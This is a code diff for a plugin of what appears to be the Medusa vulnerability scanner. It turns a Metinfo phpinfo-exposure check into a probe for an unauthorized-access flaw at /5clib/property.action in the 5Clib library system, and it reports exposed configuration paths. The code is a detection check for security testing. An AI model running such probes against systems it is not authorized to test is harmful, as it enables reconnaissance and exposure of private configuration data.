@@ -13,19 +13,16 @@ class VulnerabilityInfo(object):
         self.info = {}
         self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
         self.info['author'] = "Ascotbe"  # 插件作者
-        self.info['createDate'] = "2019-12-24"  # 插件编辑时间
-        self.info['disclosure']='2018-7-26'#漏洞披露时间，如果不知道就写编写插件的时间
-        self.info['algroup'] = "MetinfoInformationDisclosureVulnerability"  # 插件名称
-        self.info['name'] ='Metinfo信息泄露漏洞' #漏洞名称
-        self.info['affects'] = "Metinfo"  # 漏洞组件
-        self.info['desc_content'] = "install文件夹中存在一个phpinfo.php文件，里面就是一段phpinfo()代码"  # 漏洞描述
+        self.info['createDate'] = "2020-1-6"  # 插件编辑时间
+        self.info['disclosure']='2015-10-26'#漏洞披露时间，如果不知道就写编写插件的时间
+        self.info['algroup'] = "FiveClibthereIsAnUnauthorizedLoophole"  # 插件名称
+        self.info['name'] ='五车图书管理系统存在越权漏洞' #漏洞名称
+        self.info['affects'] = "5Clib"  # 漏洞组件
+        self.info['desc_content'] = "五车图书管理系统/5clib/property.action越权漏洞"  # 漏洞描述
         self.info['rank'] = "中危"  # 漏洞等级
-        self.info['suggest'] = "删除install文件夹下的phpinfo.php文件"  # 修复建议
-        self.info['version'] = "6.1.3之前版本"  # 这边填漏洞影响的版本
+        self.info['suggest'] = "升级最新的系统"  # 修复建议
+        self.info['version'] = "无"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
-
-
-
 
 def UrlProcessing(url):
     if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
@@ -43,10 +40,8 @@ def medusa(Url,RandomAgent,ProxyIp):
         port = 80
     else:
         port = port
-    # global resp
-    # global resp2
     try:
-        payload = "/install/phpinfo.php"
+        payload = "/5clib/property.action"
 
         payload_url = scheme + "://" + url +":"+ str(port) + payload
         headers = {
@@ -56,18 +51,11 @@ def medusa(Url,RandomAgent,ProxyIp):
         }
 
         s = requests.session()
-        # if ProxyIp!=None:
-        #     proxies = {
-        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-        #         "http": "http://" + str(ProxyIp)
-        #     }
-        #     resp = s.get(payload_url,headers=headers, timeout=6, proxies=proxies,verify=False)
-        # elif ProxyIp==None:
         resp = s.get(payload_url, headers=headers, timeout=6,  verify=False)
         con = resp.text
         code = resp.status_code
-        if code== 200 and con.find('System') != -1 and con.find('Configure Command') != -1 and con.find('PHP') != -1 and con.find('IPv6 Support') != -1:
-            Medusa = "{}存在php探针漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
+        if code== 200 and con.find('DEFAULT_PDF_LIB_PATH') != -1 and con.find('DEFAULT_SQL_BACKUP_PATH') != -1:
+            Medusa = "{}存在五车图书管理系统存在越权漏洞\r\n漏洞地址:\r\n{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
             _t=VulnerabilityInfo(Medusa)
             web=ClassCongregation.VulnerabilityDetails(_t.info)
             web.Intermediate() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
